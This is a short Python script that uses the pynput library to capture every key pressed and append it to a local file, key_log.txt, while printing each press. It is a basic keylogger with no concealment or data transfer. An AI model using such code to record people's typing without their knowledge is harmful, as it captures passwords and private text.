from pynput import keyboard
log_file = "key_log.txt"
def on_press(key):
    print(f"Pressed: {key}")  
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}\n")
            f.flush()  
        except AttributeError:
            f.write(f"{key}\n")
            f.flush()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
       